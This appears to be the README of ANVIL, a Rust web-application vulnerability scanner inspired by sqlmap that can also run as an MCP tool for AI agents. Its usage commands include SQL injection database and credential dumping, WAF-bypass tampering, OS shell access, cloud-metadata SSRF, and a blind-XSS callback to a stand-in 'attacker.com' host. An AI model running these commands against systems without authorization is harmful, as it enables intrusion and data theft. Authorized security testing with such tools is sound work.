# ANVIL 🔨

**Enterprise-grade Adversarial Security Testing Framework**

[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](LICENSE)
[![Rust](https://img.shields.io/badge/rust-1.70%2B-orange.svg)](https://www.rust-lang.org/)
[![Version](https://img.shields.io/badge/version-0.6.0-green.svg)](https://github.com/siddhantbhattarai/anvil)

ANVIL is a high-performance, evidence-driven web application security scanner written in Rust. It detects and safely **proves** **11 active vulnerability classes** plus **5 passive audits** — covering **8 of the OWASP Top 10** — with a low false-positive rate, and emits machine-readable reports (text, JSON, CSV) for triage and CI gating.

It is built to be driven by automation and AI agents: a one-shot `--owasp` sweep, deterministic `--fail-on` exit codes, and a built-in **MCP server** (`--mcp`) so agents like Claude Code can call it as a native tool.

## 🎯 OWASP Top 10 Coverage

| OWASP 2021 | ANVIL checks |
|------------|--------------|
| **A01** Broken Access Control | Path Traversal, Open Redirect, CORS |
| **A02** Cryptographic Failures | Secret / sensitive-data exposure |
| **A03** Injection | SQLi, NoSQLi, XSS, Command Injection, SSTI, CRLF |
| **A05** Security Misconfiguration | CORS, Security-header & cookie audit |
| **A06** Vulnerable & Outdated Components | Outdated JS library detection |
| **A07** Identification & Auth Failures | JWT weaknesses |
| **A08** Software & Data Integrity Failures | Subresource Integrity (SRI) |
| **A10** Server-Side Request Forgery | SSRF |

*A04 (Insecure Design) and A09 (Logging Failures) are not detectable via black-box scanning.*

## 🚀 Features

### Active detection classes

| Flag | Class | CWE |
|------|-------|-----|
| `--sqli` | SQL injection | CWE-89 |
| `--nosqli` | NoSQL (MongoDB operator) injection | CWE-943 |
| `--xss` | Cross-site scripting | CWE-79 |
| `--ssrf` | Server-side request forgery | CWE-918 |
| `--cmdi` | OS command injection | CWE-78 |
| `--path-traversal` | Path traversal / LFI | CWE-22 |
| `--ssti` | Server-side template injection | CWE-1336 |
| `--xxe` | XML external entity | CWE-611 |
| `--open-redirect` | Open redirect | CWE-601 |
| `--cors` | CORS misconfiguration | CWE-942 |
| `--crlf` | CRLF / HTTP header injection | CWE-113 |

### Passive analyzers

| Flag | Audit | OWASP |
|------|-------|-------|
| `--security-headers` | Missing/weak security headers & cookie flags | A05 |
| `--jwt` | JWT weaknesses (alg:none, weak secret, no expiry) | A07 |
| `--secrets` | Exposed secrets / sensitive data | A02 |
| `--components` | Outdated front-end libraries with known CVEs | A06 |
| `--sri` | Missing Subresource Integrity on cross-origin assets | A08 |

### Automation & agents
- **`--all` / `--owasp`** — run every reliable class + passive audit in one command.
- **`--fail-on <severity>`** — deterministic exit codes for CI gating (`0` clean, `2` findings ≥ threshold, `1` error).
- **`--mcp`** — run as a Model Context Protocol server (stdio JSON-RPC) exposing an `anvil_scan` tool for AI agents.
- **Output formats** — text, JSON, CSV; stable JSON schema for downstream tooling.

### SQL Injection (SQLi) — deep capabilities
- **Detection Techniques**
  - UNION-based injection
  - Boolean-based blind injection
  - Time-based blind injection
  - Error-based injection
  - DNS exfiltration (Out-of-Band)
  - Second-order injection
  - Stacked queries

- **Database Enumeration**
  - Database listing (`--dbs`)
  - Table enumeration (`--tables`)
  - Column enumeration (`--columns`)
  - Data dumping (`--dump`, `--dump-all`)
  - Schema extraction (`--schema`)
  - Row counting (`--count`)

- **Database Information**
  - Banner/version (`--banner`)
  - Current user (`--current-user`)
  - Current database (`--current-db`)
  - Hostname (`--hostname`)
  - DBA check (`--is-dba`)

- **User Enumeration**
  - List users (`--users`)
  - Password hashes (`--passwords`)
  - Privileges (`--privileges`)
  - Roles (`--roles`)

- **Advanced Features**
  - 18 tamper scripts for WAF bypass
  - Interactive SQL shell
  - File read/write from server
  - OS command execution
  - Hash cracking with dictionary

- **Supported Databases**
  - MySQL / MariaDB
  - PostgreSQL
  - Microsoft SQL Server
  - Oracle
  - SQLite
  - Microsoft Access

### Cross-Site Scripting (XSS)
- Reflected XSS detection
- Stored/Persistent XSS detection
- DOM-based XSS detection
- Blind XSS with callbacks
- Context-aware payloads (HTML, attribute, JS, URL)
- Polyglot payloads

### Server-Side Request Forgery (SSRF)
- Internal network scanning (RFC1918)
- Cloud metadata endpoint testing (AWS, GCP, Azure)
- Protocol scheme testing (file, gopher, dict)
- Blind SSRF with callbacks

### Additional Features
- **Crawling**: Automatic parameter discovery
- **Fingerprinting**: Server, OS, and framework detection
- **Authentication**: Cookie and header support
- **Rate Limiting**: Configurable request throttling
- **Output Formats**: Text, JSON, CSV

## 📦 Installation

### Linux / macOS

```bash
# Clone the repository
git clone https://github.com/siddhantbhattarai/anvil.git
cd anvil

# Run the setup script
chmod +x setup.sh
./setup.sh

# Or install manually
cargo install --path .
```

### Windows

#### Option 1: Using PowerShell Script
```powershell
# Run as Administrator
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser

# Clone and install
git clone https://github.com/siddhantbhattarai/anvil.git
cd anvil
.\setup.ps1
```

#### Option 2: Manual Installation
1. Install [Rust](https://rustup.rs/) - Download and run `rustup-init.exe`
2. Open Command Prompt or PowerShell:
```cmd
git clone https://github.com/siddhantbhattarai/anvil.git
cd anvil
cargo install --path .
```

3. Add Cargo bin to PATH if not already:
   - Open System Properties → Environment Variables
   - Add `%USERPROFILE%\.cargo\bin` to PATH

## 🔧 Usage

### Full OWASP sweep (recommended)
```bash
# Run every detection class + passive audit in one command
anvil -t "http://target.com" --owasp --crawl -o report.json --format json

# CI / agent gating: exit code 2 if anything High or worse is found
anvil -t "http://target.com" --owasp --fail-on high --format json
```

### Targeted single-class checks
```bash
anvil -t "http://host/page?id=1"    -p id   --sqli
anvil -t "http://host/find?q=cat"   -p q    --nosqli
anvil -t "http://host/search?q=t"   -p q    --xss --xss-all
anvil -t "http://host/fetch?url=x"  -p url  --ssrf
anvil -t "http://host/ping?host=x"  -p host --cmdi
anvil -t "http://host/view?file=a"  -p file --path-traversal
anvil -t "http://host/tpl?name=x"   -p name --ssti
anvil -t "http://host/api/xml"              --xxe
anvil -t "http://host/go?next=/"    -p next --open-redirect
anvil -t "http://host/api/me"               --cors
anvil -t "http://host/set?lang=en"  -p lang --crlf
```

### Passive audits
```bash
anvil -t "https://host/"                    --security-headers
anvil -t "https://host/api" --cookie 'session=eyJ...' --jwt
anvil -t "https://host/config.js"           --secrets
anvil -t "https://host/"                    --components
anvil -t "https://host/"                    --sri
```

### MCP server (for AI agents)
```bash
# Start ANVIL as an MCP server over stdio
anvil --mcp
```
Register it with an MCP-capable agent (e.g. Claude Code):
```json
{ "mcpServers": { "anvil": { "command": "anvil", "args": ["--mcp"] } } }
```
The server exposes one `anvil_scan` tool taking `target`, `profile` (`owasp` or a single class), optional `param`, and optional `fail_on`.

### Basic SQL Injection Scan
```bash
# Detect SQLi vulnerability
anvil -t "http://target.com/page.php?id=1" -p id --sqli

# Enumerate databases
anvil -t "http://target.com/page.php?id=1" -p id --sqli --dbs

# Enumerate tables in a database
anvil -t "http://target.com/page.php?id=1" -p id --sqli -D database_name --tables

# Enumerate columns in a table
anvil -t "http://target.com/page.php?id=1" -p id --sqli -D database_name -T table_name --columns

# Dump table data
anvil -t "http://target.com/page.php?id=1" -p id --sqli -D database_name -T table_name --dump

# Dump specific columns
anvil -t "http://target.com/page.php?id=1" -p id --sqli -D database_name -T table_name -C "user,pass" --dump
```

### XSS Scanning
```bash
# Basic XSS scan
anvil -t "http://target.com/search?q=test" -p q --xss

# All XSS types
anvil -t "http://target.com/search?q=test" -p q --xss-all

# Blind XSS with callback
anvil -t "http://target.com/contact" --xss-blind --callback "attacker.com"
```

### SSRF Scanning
```bash
# Basic SSRF scan
anvil -t "http://target.com/fetch?url=http://example.com" -p url --ssrf

# Cloud metadata testing
anvil -t "http://target.com/fetch?url=test" -p url --ssrf-metadata

# All SSRF tests
anvil -t "http://target.com/fetch?url=test" -p url --ssrf-all
```

### Advanced Options
```bash
# With authentication
anvil -t "http://target.com/admin?id=1" -p id --sqli --cookie "session=abc123"

# Custom headers
anvil -t "http://target.com/api?id=1" -p id --sqli -H "Authorization: Bearer token"

# POST request
anvil -t "http://target.com/login" --data "user=admin&pass=test" -p user --sqli

# Adjust risk/level
anvil -t "http://target.com/page?id=1" -p id --sqli --level 3 --risk 2

# Output to file
anvil -t "http://target.com/page?id=1" -p id --sqli --dbs -o results.json --format json
```

## 📁 Project Structure

```
anvil/
├── src/
│   ├── main.rs              # Entry point
│   ├── cli/                 # Command-line interface
│   ├── core/                # Core engine and context
│   ├── http/                # HTTP client and requests
│   ├── sqli/                # SQL Injection module
│   │   ├── core/            # Settings, enums, queries
│   │   ├── request/         # HTTP and comparison
│   │   ├── techniques/      # Detection techniques
│   │   │   ├── union/       # UNION-based
│   │   │   ├── blind/       # Boolean/Time-based
│   │   │   ├── error/       # Error-based
│   │   │   └── dns/         # DNS exfiltration
│   │   ├── tamper/          # WAF bypass scripts
│   │   ├── shell.rs         # SQL shell
│   │   ├── file_access.rs   # File read/write
│   │   └── os_shell.rs      # OS commands
│   ├── xss/                 # XSS detection module
│   ├── ssrf/                # SSRF detection module
│   ├── cmdi/                # OS command injection (CWE-78)
│   ├── nosqli/              # NoSQL injection (CWE-943)
│   ├── pathtrav/            # Path traversal / LFI (CWE-22)
│   ├── ssti/                # Server-side template injection (CWE-1336)
│   ├── xxe/                 # XML external entity (CWE-611)
│   ├── openredirect/        # Open redirect (CWE-601)
│   ├── cors/                # CORS misconfiguration (CWE-942)
│   ├── crlf/                # CRLF / header injection (CWE-113)
│   ├── secheaders/          # Passive security-header audit (A05)
│   ├── jwt/                 # JWT weakness analysis (CWE-347)
│   ├── secrets/             # Secret / sensitive-data exposure (A02)
│   ├── components/          # Outdated component detection (A06)
│   ├── sri/                 # Subresource Integrity audit (A08)
│   ├── mcp/                 # MCP server (stdio JSON-RPC) for AI agents
│   ├── scanner/             # Crawling and fingerprinting
│   ├── validation/          # Input validation
│   └── reporting/           # Output and reports
├── docs/
│   └── anvil.1              # man page
├── Cargo.toml               # Dependencies
├── setup.sh                 # Linux/macOS installer
├── setup.ps1                # Windows installer
├── LICENSE                  # Apache 2.0
└── README.md                # This file
```

## 🔒 Legal Disclaimer

This tool is intended for **authorized security testing only**. Always obtain proper authorization before testing any systems you do not own. Unauthorized access to computer systems is illegal.

The authors are not responsible for any misuse or damage caused by this tool.

## 📄 License

This project is licensed under the Apache License 2.0 - see the [LICENSE](LICENSE) file for details.

## 🤝 Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

## 👤 Author

**Siddhant Bhattarai**

- GitHub: [@siddhantbhattarai](https://github.com/siddhantbhattarai)

## ⭐ Acknowledgments

- Inspired by [sqlmap](https://sqlmap.org/) and other security tools
- Built with [Rust](https://www.rust-lang.org/) for performance and safety
